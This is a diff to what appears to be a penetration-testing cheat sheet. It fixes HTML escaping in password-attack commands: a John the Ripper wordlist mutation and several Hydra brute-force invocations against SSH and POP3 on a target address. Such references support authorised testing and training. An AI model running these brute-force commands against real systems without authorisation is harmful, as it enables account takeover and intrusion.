@@ -1545,7 +1545,7 @@ Client, Web and Password Attacks
 
         -   John the ripper can mutate password lists  
             nano /etc/john/john.conf  
-            `john --wordlist=megacorp-cewl.txt --rules --stdout &gt; mutated.txt`
+            `john --wordlist=megacorp-cewl.txt --rules --stdout > mutated.txt`
 
     -   Medusa
 
@@ -1570,10 +1570,10 @@ Client, Web and Password Attacks
             `hydra -v -V -u -L users.txt -P passwords.txt -t 1 -u $ip ssh`
 
         -   Hydra SSH using a known password and a username list  
-            `hydra -v -V -u -L users.txt -p "&lt;known password&gt;" -t 1 -u $ip ssh`
+            `hydra -v -V -u -L users.txt -p "<known password>" -t 1 -u $ip ssh`
 
         -   Hydra SSH Against Known username  
-            `hydra $ip -s 62964 ssh -l &lt;user&gt; -P big\_wordlist.txt`
+            `hydra $ip -s 62964 ssh -l <user> -P big\_wordlist.txt`
 
         -   Hydra POP3 Brute Force  
             `hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f $ip pop3 -V`
